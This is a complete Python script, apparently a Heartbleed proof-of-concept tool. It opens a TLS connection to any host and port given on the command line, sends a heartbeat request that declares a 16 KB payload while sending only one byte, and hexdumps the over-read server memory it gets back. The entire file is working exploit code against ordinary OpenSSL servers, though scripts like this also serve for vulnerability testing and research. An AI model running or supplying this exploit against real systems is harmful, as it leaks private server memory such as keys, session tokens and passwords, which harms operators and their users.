#!/usr/bin/python

import sys
import socket
import logging
from optparse import OptionParser

from tls import *

def make_hello():
    hb_extension = HeartbeatExtension.create()
    status_extension = StatusRequestExtension.create()

    hello = ClientHelloMessage.create(TLSRecord.TLS1_0,
                                      '01234567890123456789012345678901',
                                      [TLS_RSA_WITH_RC4_128_MD5,
                                       TLS_RSA_WITH_RC4_128_SHA,
                                       TLS_RSA_WITH_3DES_EDE_CBC_SHA,
                                       TLS_RSA_WITH_AES_128_CBC_SHA,
                                       TLS_RSA_WITH_AES_256_CBC_SHA,
                                       TLS_RSA_WITH_AES_128_CBC_SHA256,
                                       TLS_RSA_WITH_AES_256_CBC_SHA256],
                                      extensions = [ hb_extension,
                                                     status_extension
                                                     ])
    
    record = TLSRecord.create(content_type=TLSRecord.Handshake,
                              version=TLSRecord.TLS1_0,
                              message=hello.bytes)

    #hexdump(record.bytes)
    return record.bytes

def make_heartbeat():
    heartbeat = HeartbeatMessage.create(HeartbeatMessage.HeartbeatRequest,
                                        'X', 0x4000, '')

    record = TLSRecord.create(content_type=TLSRecord.Heartbeat,
                              version=TLSRecord.TLS1_0,
                              message=heartbeat.bytes)

    #hexdump(record.bytes)
    return record.bytes

def heartbleed(f):
    print('Sending Client Hello...')
    f.write(make_hello())

    print('Waiting for Server Hello Done...')
    while True:
        record = read_tls_record(f)

        # Look for server hello done message.
        if record.content_type() == TLSRecord.Handshake:
            message = HandshakeMessage.from_bytes(record.message())
            if message.message_type() == HandshakeMessage.ServerHelloDone:
                print('Sending heartbeat...')
                f.write(make_heartbeat())
        elif record.content_type() == TLSRecord.Alert:
            alert = AlertMessage.from_bytes(record.message())
            print(alert)
            if alert.alert_level() == AlertMessage.Fatal:
                raise IOError('Server sent a fatal alert')
        elif record.content_type() == TLSRecord.Heartbeat:
            hexdump(record.message())
        else:
            print('Record received type %d' % (record.content_type()))

    
def main():
    options = OptionParser(usage='%prog server [options]',
                           description='Test for Python SSL')
    options.add_option('-p', '--port',
                       type='int', default=443,
                       help='TCP port to test (default: 443)')
    options.add_option('-d', '--debug', action='store_true', dest='debug',
                       default=False,
                       help='Print debugging messages')

    opts, args = options.parse_args()

    if len(args) < 1:
        options.print_help()
        return

    if opts.debug:
        logging.basicConfig(level=logging.DEBUG)
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print('Connecting...')

    s.connect((args[0], opts.port))
    f = s.makefile('rw', 0)
    f = LoggedFile(f)

    heartbleed(f)
 
if __name__ == '__main__':
    main()


